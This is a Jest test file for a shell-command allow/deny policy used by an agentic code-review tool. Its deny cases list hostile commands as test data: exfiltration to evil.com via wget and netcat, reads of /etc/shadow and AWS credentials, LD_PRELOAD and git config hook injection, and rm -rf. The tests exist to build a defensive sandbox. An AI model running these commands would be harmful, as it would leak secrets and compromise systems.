import { evaluatePolicy } from '../../../../../../../src/stages/review/agentic/tools/bash/policy';

describe('evaluatePolicy', () => {
  // --------------------------------------------------------------------------
  // ALLOW cases (§3.8 compatibility table)
  // --------------------------------------------------------------------------

  describe('allowed commands', () => {
    test('git log is allowed', () => {
      expect(evaluatePolicy('git log --oneline -10')).toEqual({ deny: false });
    });

    test('git diff is allowed', () => {
      expect(evaluatePolicy('git diff HEAD~1 HEAD -- src/')).toEqual({ deny: false });
    });

    test('git status is allowed', () => {
      expect(evaluatePolicy('git status')).toEqual({ deny: false });
    });

    test('rg search is allowed', () => {
      expect(evaluatePolicy('rg "password" /workspace/pr -l')).toEqual({ deny: false });
    });

    test('grep search is allowed', () => {
      expect(evaluatePolicy('grep -r "TODO" /workspace/pr/src --include="*.ts"')).toEqual({
        deny: false,
      });
    });

    test('cat file is allowed', () => {
      expect(evaluatePolicy('cat /workspace/pr/src/auth.ts')).toEqual({ deny: false });
    });

    test('head file is allowed', () => {
      expect(evaluatePolicy('head -100 /workspace/pr/src/auth.ts')).toEqual({ deny: false });
    });

    test('tail -n N file is allowed (non-follow)', () => {
      expect(evaluatePolicy('tail -n 20 /workspace/pr/logs/test.log')).toEqual({ deny: false });
    });

    test('find without -exec is allowed', () => {
      expect(
        evaluatePolicy('find /workspace/pr -name "*.env*" -not -path "*/node_modules/*"'),
      ).toEqual({ deny: false });
    });

    test('jq on package.json is allowed', () => {
      expect(evaluatePolicy("jq '.dependencies' /workspace/pr/package.json")).toEqual({
        deny: false,
      });
    });

    test('tsc --noEmit is allowed', () => {
      expect(evaluatePolicy('tsc --noEmit')).toEqual({ deny: false });
    });

    test('eslint is allowed', () => {
      expect(evaluatePolicy('eslint src/ --format json')).toEqual({ deny: false });
    });

    test('python3 -c is allowed', () => {
      expect(
        evaluatePolicy(
          'python3 -c "import ast; print(ast.dump(ast.parse(open(\'file.py\').read())))"',
        ),
      ).toEqual({ deny: false });
    });

    test('python3 script.py is allowed', () => {
      expect(evaluatePolicy('python3 /workspace/pr/scripts/check.py')).toEqual({ deny: false });
    });

    test('python3 -m module is allowed', () => {
      expect(evaluatePolicy('python3 -m pytest tests/')).toEqual({ deny: false });
    });

    test('ls is allowed', () => {
      expect(evaluatePolicy('ls /workspace/pr/src')).toEqual({ deny: false });
    });

    test('wc -l is allowed', () => {
      expect(evaluatePolicy('wc -l /workspace/pr/src/index.ts')).toEqual({ deny: false });
    });

    test('cd within workspace is allowed', () => {
      expect(evaluatePolicy('cd /workspace/pr/src')).toEqual({ deny: false });
    });

    test('cd relative path is allowed', () => {
      expect(evaluatePolicy('cd src/auth')).toEqual({ deny: false });
    });

    test('jest is allowed', () => {
      expect(evaluatePolicy('jest --testPathPattern=auth')).toEqual({ deny: false });
    });

    test('node with script file is allowed', () => {
      expect(evaluatePolicy('node /workspace/pr/scripts/check.js')).toEqual({ deny: false });
    });

    test('node -e eval is allowed', () => {
      expect(evaluatePolicy('node -e "console.log(\'hello\')"')).toEqual({ deny: false });
    });

    test('psql with -c flag is allowed', () => {
      expect(evaluatePolicy('psql -c "SELECT 1"')).toEqual({ deny: false });
    });

    test('bash -c with literal is allowed', () => {
      expect(evaluatePolicy("bash -c 'echo hello'")).toEqual({ deny: false });
    });
  });

  // --------------------------------------------------------------------------
  // DENY cases (§3.5 hard-deny list)
  // --------------------------------------------------------------------------

  describe('denied commands', () => {
    test('curl is denied', () => {
      const result = evaluatePolicy('curl https://example.com');
      expect(result.deny).toBe(true);
    });

    test('wget is denied', () => {
      const result = evaluatePolicy('wget https://evil.com/exfil?data=secret');
      expect(result.deny).toBe(true);
    });

    test('sudo is denied', () => {
      const result = evaluatePolicy('sudo cat /etc/shadow');
      expect(result.deny).toBe(true);
    });

    test('rm is denied', () => {
      const result = evaluatePolicy('rm -rf /workspace/pr/important.ts');
      expect(result.deny).toBe(true);
    });

    test('npm install is denied', () => {
      const result = evaluatePolicy('npm install evil-package');
      expect(result.deny).toBe(true);
    });

    test('npm ci is denied', () => {
      const result = evaluatePolicy('npm ci');
      expect(result.deny).toBe(true);
    });

    test('pip install is denied', () => {
      const result = evaluatePolicy('pip install requests');
      expect(result.deny).toBe(true);
    });

    test('git config write (no read flag) is denied', () => {
      expect(evaluatePolicy('git config core.hooksPath /evil').deny).toBe(true);
    });

    test('git config --global write is denied', () => {
      expect(evaluatePolicy('git config --global core.hooksPath /evil').deny).toBe(true);
    });

    test('git config --get is allowed', () => {
      expect(evaluatePolicy('git config --get core.hooksPath').deny).toBe(false);
    });

    test('git config --list is allowed', () => {
      expect(evaluatePolicy('git config --list').deny).toBe(false);
    });

    test('git push is denied', () => {
      const result = evaluatePolicy('git push origin main');
      expect(result.deny).toBe(true);
    });

    test('git fetch is denied', () => {
      const result = evaluatePolicy('git fetch origin');
      expect(result.deny).toBe(true);
    });

    test('git commit is denied', () => {
      const result = evaluatePolicy('git commit -m "evil"');
      expect(result.deny).toBe(true);
    });

    test('git checkout is denied', () => {
      const result = evaluatePolicy('git checkout main');
      expect(result.deny).toBe(true);
    });

    test('git -c core.fsmonitor= is denied', () => {
      const result = evaluatePolicy('git -c core.fsmonitor=malicious log');
      expect(result.deny).toBe(true);
    });

    test('git -c core.hooksPath= is denied', () => {
      const result = evaluatePolicy('git -c core.hooksPath=/evil log');
      expect(result.deny).toBe(true);
    });

    test('git -ccore.hooksPath= (concatenated, no space) is denied', () => {
      const result = evaluatePolicy('git -ccore.hooksPath=/evil log');
      expect(result.deny).toBe(true);
    });

    test('LD_PRELOAD env var is denied', () => {
      const result = evaluatePolicy('LD_PRELOAD=/evil.so cat /etc/passwd');
      expect(result.deny).toBe(true);
    });

    test('DYLD_INSERT_LIBRARIES is denied', () => {
      const result = evaluatePolicy('DYLD_INSERT_LIBRARIES=/evil.dylib ls');
      expect(result.deny).toBe(true);
    });

    test('trailing & is denied', () => {
      const result = evaluatePolicy('cat /etc/passwd &');
      expect(result.deny).toBe(true);
    });

    test('nohup is denied', () => {
      const result = evaluatePolicy('nohup evil-script.sh &');
      expect(result.deny).toBe(true);
    });

    test('bare python (REPL) is denied', () => {
      const result = evaluatePolicy('python3');
      expect(result.deny).toBe(true);
    });

    test('bare node (REPL) is denied', () => {
      const result = evaluatePolicy('node');
      expect(result.deny).toBe(true);
    });

    test('bare psql (REPL) is denied', () => {
      const result = evaluatePolicy('psql postgres://user:pass@host/db');
      expect(result.deny).toBe(true);
    });

    test('cd to /etc is denied', () => {
      const result = evaluatePolicy('cd /etc');
      expect(result.deny).toBe(true);
    });

    test('cd /workspace/../etc traversal is denied', () => {
      expect(evaluatePolicy('cd /workspace/../etc', { workspaceRoot: '/workspace' }).deny).toBe(
        true,
      );
    });

    test('cd to /root is denied', () => {
      const result = evaluatePolicy('cd /root');
      expect(result.deny).toBe(true);
    });

    test('output redirection to absolute path is denied', () => {
      const result = evaluatePolicy('cat /workspace/pr/src/auth.ts > /tmp/exfil');
      expect(result.deny).toBe(true);
    });

    test('tail -f is denied (interactive)', () => {
      const result = evaluatePolicy('tail -f /workspace/pr/logs/test.log');
      expect(result.deny).toBe(true);
    });

    test('ssh is denied', () => {
      const result = evaluatePolicy('ssh user@host');
      expect(result.deny).toBe(true);
    });

    test('nc (netcat) is denied', () => {
      const result = evaluatePolicy('nc evil.com 1234');
      expect(result.deny).toBe(true);
    });

    test('docker is denied', () => {
      const result = evaluatePolicy('docker run --rm alpine cat /etc/shadow');
      expect(result.deny).toBe(true);
    });

    test('empty command is denied', () => {
      const result = evaluatePolicy('');
      expect(result.deny).toBe(true);
    });

    test('git unknown subcommand is denied', () => {
      const result = evaluatePolicy('git bisect start');
      expect(result.deny).toBe(true);
    });

    test('bash -c with variable expansion is denied', () => {
      const result = evaluatePolicy('bash -c "cat $HOME/.aws/credentials"');
      expect(result.deny).toBe(true);
    });

    test('bash -c with concatenated flag (no space) and expansion is denied', () => {
      const result = evaluatePolicy('bash -c"cat $HOME/.aws/credentials"');
      expect(result.deny).toBe(true);
    });

    test('bash with no args (REPL) is denied', () => {
      const result = evaluatePolicy('bash');
      expect(result.deny).toBe(true);
    });

    test('eval is denied', () => {
      const result = evaluatePolicy('eval "malicious code"');
      expect(result.deny).toBe(true);
    });

    test('npx with exec is denied', () => {
      const result = evaluatePolicy('npx exec evil-pkg');
      expect(result.deny).toBe(true);
    });
  });

  // --------------------------------------------------------------------------
  // Extra config: extraDeniedBinaries
  // --------------------------------------------------------------------------

  describe('extraDeniedBinaries config', () => {
    test('custom denied binary is blocked', () => {
      const result = evaluatePolicy('my-custom-tool --dump', {
        extraDeniedBinaries: ['my-custom-tool'],
      });
      expect(result.deny).toBe(true);
    });

    test('non-denied custom binary is allowed', () => {
      const result = evaluatePolicy('other-tool --check', {
        extraDeniedBinaries: ['my-custom-tool'],
      });
      expect(result.deny).toBe(false);
    });
  });

  // --------------------------------------------------------------------------
  // §3.5 spec rules not yet covered
  // --------------------------------------------------------------------------

  describe('additional spec §3.5 deny rules', () => {
    // Background / session escape
    test('setsid is denied', () => {
      expect(evaluatePolicy('setsid daemon &').deny).toBe(true);
    });

    test('disown is denied', () => {
      expect(evaluatePolicy('disown %1').deny).toBe(true);
    });

    test('su is denied', () => {
      expect(evaluatePolicy('su -c "cat /etc/shadow"').deny).toBe(true);
    });

    test('doas is denied', () => {
      expect(evaluatePolicy('doas sh').deny).toBe(true);
    });

    // cd escape (spec §3.5 lines 912-915)
    test('cd / is denied', () => {
      expect(evaluatePolicy('cd /').deny).toBe(true);
    });

    test('cd ~ is denied', () => {
      expect(evaluatePolicy('cd ~').deny).toBe(true);
    });

    test('cd - is denied', () => {
      expect(evaluatePolicy('cd -').deny).toBe(true);
    });

    // LD_LIBRARY_PATH (spec §3.5 line 940)
    test('LD_LIBRARY_PATH env injection is denied', () => {
      expect(evaluatePolicy('LD_LIBRARY_PATH=/evil ls').deny).toBe(true);
    });

    // git -c dangerous config keys (spec §3.5 lines 922-925)
    test('git -c gpg.program= is denied', () => {
      expect(evaluatePolicy('git -c gpg.program=/evil/gpg log').deny).toBe(true);
    });

    test('git -c core.editor= is denied', () => {
      expect(evaluatePolicy('git -c core.editor=evil commit').deny).toBe(true);
    });

    test('git -c sequence.editor= is denied', () => {
      expect(evaluatePolicy('git -c sequence.editor=evil rebase').deny).toBe(true);
    });

    test('git -c uploadpack.packObjectsHook= is denied', () => {
      expect(evaluatePolicy('git -c uploadpack.packObjectsHook=evil ls-files').deny).toBe(true);
    });

    test('git -c credential.helper= is denied', () => {
      expect(evaluatePolicy('git -c credential.helper=evil log').deny).toBe(true);
    });

    // git remote write subcommands (spec §3.5 lines 903-904)
    test('git remote add is denied', () => {
      expect(evaluatePolicy('git remote add origin https://evil.com/repo.git').deny).toBe(true);
    });

    test('git remote set-url is denied', () => {
      expect(evaluatePolicy('git remote set-url origin https://evil.com/repo.git').deny).toBe(true);
    });

    test('git remote get-url is allowed', () => {
      expect(evaluatePolicy('git remote get-url origin').deny).toBe(false);
    });

    test('git remote -v is allowed', () => {
      expect(evaluatePolicy('git remote -v').deny).toBe(false);
    });

    // Append redirection to absolute path
    test('>> to absolute path is denied', () => {
      expect(evaluatePolicy('cat /workspace/pr/file.ts >> /tmp/exfil').deny).toBe(true);
    });

    // Interactive REPL additions (spec §3.5 lines 959-962)
    test('bare sqlite3 is denied', () => {
      expect(evaluatePolicy('sqlite3 /workspace/pr/db.sqlite').deny).toBe(true);
    });

    test('sqlite3 with SQL query is allowed', () => {
      expect(
        evaluatePolicy('sqlite3 /workspace/pr/db.sqlite "SELECT * FROM users LIMIT 5"').deny,
      ).toBe(false);
    });

    test('mongosh is denied', () => {
      expect(evaluatePolicy('mongosh mongodb://localhost/mydb').deny).toBe(true);
    });

    test('ipython is denied', () => {
      expect(evaluatePolicy('ipython').deny).toBe(true);
    });

    test('deno is denied', () => {
      expect(evaluatePolicy('deno').deny).toBe(true);
    });

    test('bun is denied', () => {
      expect(evaluatePolicy('bun').deny).toBe(true);
    });

    // File-reading tools outside workspace (path-outside-workspace rule)
    test('cat /etc/passwd is denied', () => {
      expect(evaluatePolicy('cat /etc/passwd').deny).toBe(true);
    });

    test('cat /etc/shadow is denied', () => {
      expect(evaluatePolicy('cat /etc/shadow').deny).toBe(true);
    });

    test('head /etc/passwd is denied', () => {
      expect(evaluatePolicy('head /etc/passwd').deny).toBe(true);
    });

    test('cp /etc/passwd /tmp/exfil is denied', () => {
      expect(evaluatePolicy('cp /etc/passwd /tmp/exfil').deny).toBe(true);
    });

    test("cat with single-quoted absolute path '/etc/passwd' is denied", () => {
      expect(evaluatePolicy("cat '/etc/passwd'").deny).toBe(true);
    });

    test("cat with ANSI-C quoted path $'/etc/passwd' is denied", () => {
      expect(evaluatePolicy("cat $'/etc/passwd'").deny).toBe(true);
    });

    test('cat with double-quoted absolute path "/etc/passwd" is denied', () => {
      expect(evaluatePolicy('cat "/etc/passwd"').deny).toBe(true);
    });

    test('cat within workspace is allowed', () => {
      expect(
        evaluatePolicy('cat /workspace/pr/src/foo.ts', { workspaceRoot: '/workspace' }).deny,
      ).toBe(false);
    });

    test('cat relative path is allowed', () => {
      expect(evaluatePolicy('cat src/foo.ts').deny).toBe(false);
    });

    test('cat relative path traversal is denied when workspaceRoot is set', () => {
      expect(evaluatePolicy('cat ../../etc/passwd', { workspaceRoot: '/workspace' }).deny).toBe(
        true,
      );
    });

    test('cat relative path within workspace is allowed when workspaceRoot is set', () => {
      expect(evaluatePolicy('cat src/foo.ts', { workspaceRoot: '/workspace/pr' }).deny).toBe(false);
    });
  });

  // --------------------------------------------------------------------------
  // §3.8 compatibility allows not yet covered
  // --------------------------------------------------------------------------

  describe('additional spec §3.8 compatibility allows', () => {
    test('mysql -e SQL is allowed', () => {
      expect(evaluatePolicy('mysql -e "SELECT 1"').deny).toBe(false);
    });

    test('bash -c with single-quoted literal pipeline is allowed', () => {
      // single-quoted — no expansion, re-parse safe (spec line 1213)
      expect(evaluatePolicy("bash -c 'rg foo | head'").deny).toBe(false);
    });

    test('time prefix before command is allowed', () => {
      // `time` is not in HARD_DENY_BINARIES; runs the following command
      expect(evaluatePolicy('time pytest tests/auth.py').deny).toBe(false);
    });

    test('env-var prefix stripping allows FOO=bar pytest', () => {
      // FOO=bar is an assignment prefix, not a binary
      expect(evaluatePolicy('FOO=bar BAZ=qux pytest').deny).toBe(false);
    });

    test('process substitution diff is allowed', () => {
      // diff <(rg foo a) <(rg foo b) — & inside <(...) is internal plumbing
      expect(evaluatePolicy('diff <(rg foo a) <(rg foo b)').deny).toBe(false);
    });

    test('subshell with cd inside is allowed', () => {
      // (cd subdir && rg foo) — subshell, cd doesn't drift
      expect(evaluatePolicy('(cd src && rg foo)').deny).toBe(false);
    });

    test('for loop over rg output is allowed', () => {
      expect(evaluatePolicy('for f in $(rg -l TODO /workspace/pr); do cat "$f"; done').deny).toBe(
        false,
      );
    });

    test('git log piped to while read is allowed', () => {
      expect(
        evaluatePolicy('git log --oneline | while read sha msg; do echo "$sha"; done').deny,
      ).toBe(false);
    });
  });
});
